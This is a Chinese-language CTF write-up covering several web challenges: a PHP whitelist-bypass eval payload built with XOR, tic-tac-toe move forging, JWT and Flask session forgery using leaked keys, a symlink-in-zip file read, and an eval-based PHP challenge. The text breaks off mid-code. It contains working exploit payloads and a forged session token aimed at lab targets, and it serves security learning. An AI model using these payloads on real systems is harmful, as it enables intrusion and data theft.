<h4 id="NESTCTF-2019-Love-Math-2"><a href="#NESTCTF-2019-Love-Math-2" class="headerlink" title="[NESTCTF 2019]Love Math 2"></a>[NESTCTF 2019]Love Math 2</h4><p>之前做过类似的题目</p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>审计代码+审题</strong></p>
<p>规定get传入的值长度要小于60，且不能有空格等特殊符号，除此之外对于使用的数学函数进行了限制，但是看过之后没有可以在字符和数值之间转换的函数，那么应该是不能直接利用的</p>
<p>那或许我们可以利用取反或者异或运算来得到我们想要的函数</p>
<p>比如我们像执行的代码为：<code>system(&#39;cat /flag&#39;);</code>也可以构造<code>$_GET[1]($_GET[2]);</code></p>
<p>可以试着写个脚本跑一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;1234567890!@#$%^&amp;*()_+=-&#x27;</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">0</span>;<span class="variable">$k</span> &lt; <span class="number">9</span>;<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="comment">// echo $value.&quot;\n&quot;;</span></span><br><span class="line">                <span class="comment">// echo ($j.$k).&quot;\n&quot;;</span></span><br><span class="line">                <span class="variable">$a</span> = (<span class="variable">$value</span> ^ <span class="variable">$j</span>.<span class="variable">$k</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;_G&#x27;</span> || <span class="variable">$a</span> == <span class="string">&#x27;ET&#x27;</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>).<span class="string">&quot; = <span class="subst">$a</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$b</span> = <span class="variable">$value</span> ^ (<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$b</span> == <span class="string">&#x27;SYS&#x27;</span> || <span class="variable">$b</span> == <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>).<span class="string">&quot; = <span class="subst">$b</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\n&quot;;</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># is_finite^64 = _G</span></span><br><span class="line"><span class="comment"># is_infinite^64 = _G</span></span><br><span class="line"><span class="comment"># is_nan^64 = _G</span></span><br><span class="line"><span class="comment"># mt_getrandmax^23 = _G</span></span><br><span class="line"><span class="comment"># mt_rand^23 = _G</span></span><br><span class="line"><span class="comment"># mt_srand^23 = _G</span></span><br><span class="line"><span class="comment"># rad2deg^75 = ET</span></span><br><span class="line"><span class="comment"># rand^75 = ET</span></span><br><span class="line"><span class="comment"># srand^475 = GET</span></span><br><span class="line"><span class="comment"># tan^15 = ET</span></span><br><span class="line"><span class="comment"># tanh^15 = ET</span></span><br></pre></td></tr></table></figure>

<p>最后选最短的几个来组成payload吧：（注意这里的64的类型要是字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls%20/</span><br></pre></td></tr></table></figure>

<p>之后cat一下就可以得到flag了</p>
<h4 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h4><p>打开靶机，不知道为什么点击没反应，F12之后发现cookie里面有session，但是base64解码之后只看出来了又sessionid，之后查看了一下源码，发现原来每个格子都对应着一个id</p>
<p><img src="https://img-blog.csdnimg.cn/67f21a816e3346db8c865c1dfeb09261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>并且有<code>action=/move</code>而input标签可以利用move输入对应的值，那么随便试一下，好嘛，这不就是我们经常玩的井字棋嘛<img src="https://img-blog.csdnimg.cn/ba82e29e7954461e9be303f5d075062d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那就直接选三个可以连起来的进行post传值就可以得到flag了</p>
<p>payload：（直接强制性传就好啦 即使br处出现了圆圈也不会有什么影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move=c</span><br><span class="line">move=ul</span><br><span class="line">move=br</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h4><ul>
<li>jwt</li>
</ul>
<p>打开靶机，开始是登陆注册，先试一下admin万能密码登录，没有成功，注册admin发现admin用户已存在，那先随便注册一个账号进去吧</p>
<p>然后发现是文件上传，都试了一遍之后可以确定不是文件上传的漏洞了</p>
<p><img src="https://img-blog.csdnimg.cn/9116b9c5c52447c3a8fe11ef3dfcd4bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>抓包之后发现cookie里面有sessionid，格式明显就是jwt，直接解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/b9621411185b4f03a5346cc3756b175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>说明我们可以伪造我们的身份为admin，然后进去看看，但是现在重点是怎么获得密钥</p>
<p>遇事不决，扫一下后台把，发现有robots.txt（太久没做题，导致有时候应该能直接自己试出来的东西要从头开始过了害</p>
<p><img src="https://img-blog.csdnimg.cn/1a490bf975cc483085c6479fbbf1163f.png" alt="img"></p>
<p>查看robots.txt之后可以得到密钥啦：<code>you-will-never-guess</code></p>
<p>直接解密之后加密，抓包放包：</p>
<p><img src="https://img-blog.csdnimg.cn/af8428d257eb4a7ab2255990f6d7bada.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现有flag.png，但是发现个问题，直接访问是得不到flag的，想到之前可以利用curl下载文件</p>
<p><img src="https://img-blog.csdnimg.cn/3d8a1e915f6f4a478d35f353cec9e4f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>用curl试了好多命令之后，没想到直接curl url就可以得到flag了，还得继续学习curl的用途呢</p>
<p><img src="https://img-blog.csdnimg.cn/ec5ef169a68a42e5b67949a925b50a01.png" alt="img"></p>
<h4 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h4><ul>
<li>flask session伪造</li>
</ul>
<p>打开靶机，登录页面没有限制，登录进去之后有upload界面，但是没有权限，并且3秒之后自动返回首页，F12查看cookie之后发现有session值，格式很像jwt，但是jwt解码之后出现乱码，那也可能是flask session，用脚本强制解码之后可以得到：</p>
<p><img src="https://img-blog.csdnimg.cn/98135d0238f04408884d2484d82f84a6.png" alt="img"></p>
<p>其中，后面的username和password解码之后都是default，那么猜测如果把username改成admin会怎么样，但是没有密钥，那么试着看看robots.txt有没有提示，发现有这个文件，虽然返回了<code>404 not found</code>但是页面加载是200，说明是存在这个文件的，可以在F12之后发现某个特别的内容：</p>
<p><img src="https://img-blog.csdnimg.cn/2c3d0aa3044046fa8dafb9a84943a1cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>base64解码之后得到密钥：（虽然不确定后面的那些符号是不是，先测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3aaeade9571a40fb9b2ce41770ed1dbc.png" alt="img"></p>
<p>可以发现是正确的呢，那就直接伪造啦（这里是试了好多次之后，都不对，看了别的师傅的wp之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Yek0bA.1lnXSowFDjHbyuAnUGKfWtYEN84</span><br></pre></td></tr></table></figure>

<p>抓包修改之后就获得了文件上传的权限，看源码可以得到文件上传的python源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]: <span class="comment"># 只能上传zip文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base): <span class="comment"># 创建路径</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>: <span class="comment"># 如果存在|或者;</span></span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以知道upload路由里进行文件上传并且对文件解压缩之后查看文件内容</p>
<p>而showflag路由里面，由于if条件永假，所以我们无法通过该路由获取flag，但是这个路由告诉我们flag文件所在的路径<code>./flag/flag.jpg</code></p>
<p>之后看了别的师傅的wp：<a href="https://blog.csdn.net/SopRomeo/article/details/108334393">参考</a>这里提到了<a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">软连接的使用</a></p>
<p>命令：（注意 这里的flag文件需要绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>

<p>上传文件，抓包得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/d6568ca2918447169f9bdc80a110e0fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h4><ul>
<li>php FFI扩展</li>
</ul>
<p>代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看phpinfo里面给了我们什么信息，经典常用命令执行函数都被ban了</p>
<p><img src="https://img-blog.csdnimg.cn/e70fbdace5f043f8b31be121c1602434.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>随便尝试一下，很多函数例如var_dump,print_r,echo,file_get_contents,file_put_contents都没有被ban，还是有机会的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>查看文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=file_get_contents(&quot;/var/www/html/preload.php&quot;);</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span 